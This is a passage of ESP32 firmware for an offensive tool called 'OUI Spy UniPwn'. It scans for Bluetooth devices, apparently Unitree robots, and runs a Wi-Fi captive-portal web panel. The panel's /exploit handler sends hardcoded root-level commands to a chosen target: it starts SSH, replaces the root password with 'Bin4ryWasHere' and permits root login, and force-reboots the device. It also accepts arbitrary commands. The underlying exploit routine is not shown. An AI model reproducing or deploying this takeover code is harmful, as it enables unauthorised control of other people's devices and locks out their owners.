                            const logOutput = document.getElementById('logOutput');
                            const lines = data.serial.split('\\<br>').filter(line => line.trim());
                            
                            // Process each line with color coding
                            lines.forEach(line => {
                                if (line.trim() === '') return;
                                
                                let logType = 'serial';
                                let timestamp = new Date().toLocaleTimeString();
                                
                                // Determine log type based on content for color coding
                                if (line.includes('TARGET DETECTED') || line.includes('Found:')) {
                                    logType = 'detection';
                                } else if (line.includes('BLE Device:') || line.includes('Scanning for')) {
                                    logType = 'ble';
                                } else if (line.includes('UUID')) {
                                    logType = 'uuid';
                                } else if (line.includes('[WEB]')) {
                                    logType = 'web';
                                } else if (line.includes('ERROR') || line.includes('FAILED')) {
                                    logType = 'error';
                                }
                                
                                // Add to log with proper formatting
                                logOutput.value += timestamp + ' [SERIAL] ' + line + '<br>';
                            });
                            
                            logOutput.scrollTop = logOutput.scrollHeight;
                        }
                    })
                    .catch(() => console.log('Serial fetch failed'));
            }, 1000);  // Fetch serial logs every second
        });
    </script>
</body>
</html>
)rawliteral";

// Web server handlers
void setASCIIBackground() {
    // This will be handled via JavaScript after page load
}

void handleRoot() {
    String fullHTML = String(webPageHTML);
    // ASCII background disabled. You can re-enable by injecting getASCIIArt() into the background div.
    fullHTML.replace("<div class=\"ascii-background\"></div>", "<div class=\"ascii-background\"></div>");
    webServer.send(200, "text/html", fullHTML);
}

void handleScan() {
    Serial.println("\n[WEB] ═══ BLE SCAN REQUESTED ═══");
    
    // Start continuous BLE scan
    startContinuousScanning();
    
    // Wait a moment for scan to complete
    delay(100);
    
    // Build JSON response for continuous scanning start
    String json = "{\"success\": true, \"continuous\": true, \"devices\": [], \"message\": \"Continuous scanning started\"}";
    
    Serial.println("[WEB] └─ Response sent to web interface\n");
    webServer.send(200, "application/json", json);
}

void handleStopScan() {
    Serial.println("[WEB] Scan stopped");
    
    // Stop continuous scanning
    stopContinuousScanning();
    
    // Build JSON response with final discovered devices
    String json = "{\"success\": true, \"devices\": [";
    
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"address\": \"" + discoveredDevices[i].address + "\",";
        json += "\"name\": \"" + discoveredDevices[i].name + "\",";
        json += "\"rssi\": " + String(discoveredDevices[i].rssi) + ",";
        json += "\"uuid\": \"" + discoveredDevices[i].uuid + "\"";
        json += "}";
    }
    
    json += "], \"message\": \"Scanning stopped\"}";
    
    webServer.send(200, "application/json", json);
}

void handlePoll() {
    // Real-time polling endpoint for immediate updates
    if (realtimeUpdateAvailable) {
        Serial.println("[WEB] Real-time update sent");
        webServer.send(200, "application/json", lastRealtimeUpdate);
        realtimeUpdateAvailable = false;
    } else {
        // Send current discovered devices
        String json = "{\"success\": true, \"devices\": [";
        
        for (int i = 0; i < discoveredDevices.size(); i++) {
            if (i > 0) json += ",";
            json += "{";
            json += "\"address\": \"" + discoveredDevices[i].address + "\",";
            json += "\"name\": \"" + discoveredDevices[i].name + "\",";
            json += "\"rssi\": " + String(discoveredDevices[i].rssi) + ",";
            json += "\"uuid\": \"" + discoveredDevices[i].uuid + "\"";
            json += "}";
        }
        
        json += "]}";
        webServer.send(200, "application/json", json);
    }
}

void handleExploit() {
    if (webServer.method() != HTTP_POST) {
        webServer.send(405, "text/plain", "Method not allowed");
        return;
    }
    
    String body = webServer.arg("plain");
    Serial.println("\n[WEB] ═══ EXPLOIT REQUEST ═══");
    Serial.println("[WEB] Payload: " + body.substring(0, 100) + (body.length() > 100 ? "..." : ""));
    
    // Parse JSON request
    DynamicJsonDocument requestDoc(1024);
    deserializeJson(requestDoc, body);
    
    String targetAddress = requestDoc["target"];
    String command = requestDoc["command"];
    String method = requestDoc["method"];
    
    Serial.println("[WEB] ├─ Target: " + targetAddress);
    Serial.println("[WEB] ├─ Command: " + command.substring(0, 50) + (command.length() > 50 ? "..." : ""));
    Serial.println("[WEB] └─ Method: " + method);
    
    // Find target device in discovered list
    int targetIndex = -1;
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (discoveredDevices[i].address.equals(targetAddress)) {
            targetIndex = i;
            break;
        }
    }
    
    if (targetIndex == -1) {
        String json = R"({"success": false, "error": "Target device not found"})";
        webServer.send(400, "application/json", json);
        return;
    }
    
    // Execute real exploit
    bool success = false;
    
    if (command == "enable_ssh") {
        success = executeCommand(discoveredDevices[targetIndex], "/etc/init.d/ssh start");
    } else if (command == "change_root_pwd") {
        success = executeCommand(discoveredDevices[targetIndex], "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;");
    } else if (command == "reboot") {
        success = executeCommand(discoveredDevices[targetIndex], "reboot -f");
    } else {
        // Custom command
        success = executeCommand(discoveredDevices[targetIndex], command);
    }
    
    if (success) {
        String json = R"({"success": true, "message": "Exploit executed successfully"})";
        webServer.send(200, "application/json", json);
    } else {
        String json = R"({"success": false, "error": "Exploit execution failed"})";
        webServer.send(500, "application/json", json);
    }
}

void handleStatus() {
    String json = "{";
    json += "\"freeHeap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"uptime\":\"" + String(millis() / 1000) + "s\",";
    json += "\"wifiStatus\":\"" + String(WiFi.getMode() == WIFI_AP ? "AP Mode" : "STA Mode") + "\",";
    json += "\"bleStatus\":\"" + String(BLEDevice::getInitialized() ? "Active" : "Inactive") + "\",";
    json += "\"devicesFound\":" + String(discoveredDevices.size());
    json += "}";
    webServer.send(200, "application/json", json);
}

void handleHandshake() {
    if (!webServer.hasArg("target")) {
        webServer.send(400, "application/json", "{\"success\":false,\"error\":\"Missing target\"}");
        return;
    }
    String addr = webServer.arg("target");
    int targetIndex = -1;
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (discoveredDevices[i].address.equals(addr)) { targetIndex = i; break; }
    }
    if (targetIndex == -1) {
        webServer.send(404, "application/json", "{\"success\":false,\"error\":\"Target not found\"}");
        return;
    }
    bool ok = performHandshake(discoveredDevices[targetIndex]);
    if (ok) {
        webServer.send(200, "application/json", "{\"success\":true}");
    } else {
        webServer.send(500, "application/json", "{\"success\":false,\"error\":\"Handshake failed\"}");
    }
}

void handleSerial() {
    // Return the actual serial log buffer for display in operations log
    String json = "{\"success\": true, \"serial\": \"" + serialLogBuffer + "\"}";
    webServer.send(200, "application/json", json);
    
    // Clear buffer after sending to prevent duplicate entries
    serialLogBuffer = "";
}

void handleNotFound() {
    webServer.send(404, "text/plain", "Page not found");
}

void handleHardware() {
    // Return current hardware settings
    String json = "{\"success\": true, \"buzzer\": " + String(buzzerEnabled ? "true" : "false") + 
                  ", \"led\": " + String(ledEnabled ? "true" : "false") + "}";
    webServer.send(200, "application/json", json);
}

void handleToggle() {
    if (webServer.hasArg("setting") && webServer.hasArg("value")) {
        String setting = webServer.arg("setting");
        String value = webServer.arg("value");
        bool enabled = (value == "1");
        
        if (setting == "buzzer") {
            buzzerEnabled = enabled;
            Serial.println("Web: Buzzer " + String(enabled ? "enabled" : "disabled"));
            if (enabled) {
                // Test beep when enabled
                #if ENABLE_BUZZER
                singleBeep();
                #endif
            } else {
                // Stop any active buzzing when disabled
                #if ENABLE_BUZZER
                stopProximityBeep();
                ledcWrite(BUZZER_PIN, 0);
                #endif
            }
            saveConfiguration();
            webServer.send(200, "text/plain", "OK");
        } else if (setting == "led") {
            ledEnabled = enabled;
            Serial.println("Web: LED " + String(enabled ? "enabled" : "disabled"));
            if (enabled) {
                // Test blink when enabled
                #if ENABLE_LED_FEEDBACK
                ledBlink(200);
                #endif
            } else {
                // Turn off LED when disabled
                #if ENABLE_LED_FEEDBACK
                stopProximityLED();
                digitalWrite(LED_PIN, HIGH);  // HIGH = OFF (inverted logic)
                #endif
            }
            saveConfiguration();
            webServer.send(200, "text/plain", "OK");
        } else {
            webServer.send(400, "text/plain", "Invalid setting");
        }
    } else {
        webServer.send(400, "text/plain", "Missing parameters");
    }
}

// Function to mirror serial output to web operations log
void mirrorSerialToWeb(const String& message) {
    // Skip ALL menu-related output - we only want actual serial content
    if (message.indexOf("=== OUI Spy UniPwn Menu ===") != -1 ||
        message.indexOf("1. Use web app") != -1 ||
        message.indexOf("2. Show recent") != -1 ||
        message.indexOf("3. Connect and") != -1 ||
        message.indexOf("4. Toggle verbose") != -1 ||
        message.indexOf("5. Show attack") != -1 ||
        message.indexOf("6. System information") != -1 ||
        message.indexOf("7. Web interface") != -1 ||
        message.indexOf("8. Toggle buzzer") != -1 ||
        message.indexOf("9. Toggle LED") != -1 ||
        message.indexOf("Enter choice:") != -1 ||
        message.indexOf("Available devices:") != -1 ||
        message.indexOf("Select device") != -1) {
        return;
    }
    
    // Skip background spam messages
    if (message.indexOf("TARGETS DISPLAYED:") != -1 ||
        message.indexOf("showTargets completed") != -1 ||
        message.indexOf("Creating button for device:") != -1 ||
        message.indexOf("Button clicked for:") != -1 ||
        message.indexOf("Device object:") != -1 ||
        message.indexOf("=== TARGET SELECTION ===") != -1 ||
        message.indexOf("selectDevice called with:") != -1 ||
        message.indexOf("Device name:") != -1 ||
        message.indexOf("Device address:") != -1 ||
        message.indexOf("Device UUID:") != -1 ||
        message.indexOf("selectedDevice set to:") != -1 ||
        message.indexOf("Updating target display element") != -1) {
        return;
    }
    
    // Clean message and determine type for proper web log formatting
    String cleanMessage = message;
    cleanMessage.replace("\033[1;95m", "");  // Remove hot pink
    cleanMessage.replace("\033[1;32m", "");  // Remove bold green
    cleanMessage.replace("\033[1;31m", "");  // Remove bold red
    cleanMessage.replace("\033[1;33m", "");  // Remove bold yellow
    cleanMessage.replace("\033[1;34m", "");  // Remove bold blue
    cleanMessage.replace("\033[1;36m", "");  // Remove bold cyan
    cleanMessage.replace("\033[0m", "");     // Remove reset
    cleanMessage.replace("\033[41;1;37m", ""); // Remove red background
    
    // Just store the clean serial output directly - same as USB UART
    serialLogBuffer += cleanMessage + "<br>";
    
    // Keep buffer manageable (last 50 commands)
    int commandCount = 0;
    for (int i = serialLogBuffer.length() - 1; i >= 0; i--) {
        if (serialLogBuffer.substring(i, i+2) == "<br>") {
            commandCount++;
            if (commandCount > 50) {
                serialLogBuffer = serialLogBuffer.substring(i + 2);
                break;
            }
        }
    }
}

// Real-time target notification for immediate UI updates
void notifyWebInterfaceNewTarget(const UnitreeDevice& device) {
    // Hot pink highlighting for immediate detection
    Serial.println("\n\033[1;95m[WEB] TARGET DETECTED: " + device.name + " [" + device.address + "] (" + String(device.rssi) + "dBm)\033[0m");
    
    // UUID info only (detection already logged immediately in onResult)
    if (device.uuid != "NO_SERVICES" && device.uuid.length() > 0) {
        String uuidLog = "└─ UUID: " + device.uuid;
        serialLogBuffer += uuidLog + "<br>";
    }
    
    // Send immediate JSON update with current discovered devices
    String json = "{\"success\": true, \"realtime\": true, \"immediate\": true, \"devices\": [";
    
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"address\": \"" + discoveredDevices[i].address + "\",";
        json += "\"name\": \"" + discoveredDevices[i].name + "\",";
        json += "\"rssi\": " + String(discoveredDevices[i].rssi) + ",";
        json += "\"uuid\": \"" + discoveredDevices[i].uuid + "\"";
        json += "}";
    }
    
    json += "]}";
    
    Serial.println("[WEB] └─ Real-time notification sent to web UI");
    // Store this for any pending web requests
    lastRealtimeUpdate = json;
    realtimeUpdateAvailable = true;
}

void setupWebInterface() {
    // Set up access point
    WiFi.mode(WIFI_AP);
    WiFi.softAP(WIFI_AP_SSID, WIFI_AP_PASSWORD);
    
    // Setup DNS server for captive portal
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    // Setup web server routes
    webServer.on("/", handleRoot);
    webServer.on("/scan", HTTP_POST, handleScan);
    webServer.on("/stop", HTTP_POST, handleStopScan);
    webServer.on("/poll", HTTP_GET, handlePoll);  // Real-time polling endpoint
    webServer.on("/serial", HTTP_GET, handleSerial);  // Serial debug logs endpoint
    webServer.on("/exploit", HTTP_POST, handleExploit);
    webServer.on("/handshake", HTTP_POST, [](){
        if (!webServer.hasArg("target")) {
            webServer.send(400, "application/json", "{\"success\":false,\"error\":\"Missing target\"}");
            return;
        }
        String body = webServer.arg("plain");
        String target = webServer.arg("target");
        int idx = -1;
        for (int i = 0; i < discoveredDevices.size(); i++) {
            if (discoveredDevices[i].address.equals(target)) { idx = i; break; }
        }
        if (idx == -1) {
            webServer.send(404, "application/json", "{\"success\":false,\"error\":\"Target not found\"}");
            return;
        }
        bool ok = performHandshake(discoveredDevices[idx]);
        if (ok) webServer.send(200, "application/json", "{\"success\":true}");
        else webServer.send(500, "application/json", "{\"success\":false,\"error\":\"Handshake failed\"}");
    });
    webServer.on("/status", handleStatus);
    webServer.on("/toggle", HTTP_POST, handleToggle);
    webServer.on("/hardware", HTTP_GET, handleHardware);
    webServer.onNotFound(handleNotFound);
    
    // Start web server
    webServer.begin();
    
    Serial.println("\n╔═══════════════════════════════════════════╗");
    Serial.println("║       WEB INTERFACE ACTIVE & READY       ║");
    Serial.println("╠═══════════════════════════════════════════╣");
    Serial.println("║ SSID: " + String(WIFI_AP_SSID).substring(0, 32) + String(32 - String(WIFI_AP_SSID).length(), ' ') + " ║");
    Serial.println("║ Password: " + String(WIFI_AP_PASSWORD) + String(24 - String(WIFI_AP_PASSWORD).length(), ' ') + " ║");
    Serial.println("║ URL: http://192.168.4.1" + String(18, ' ') + " ║");
    Serial.println("╚═══════════════════════════════════════════╝\n");
}

void handleWebInterface() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}

#endif // ENABLE_WEB_INTERFACE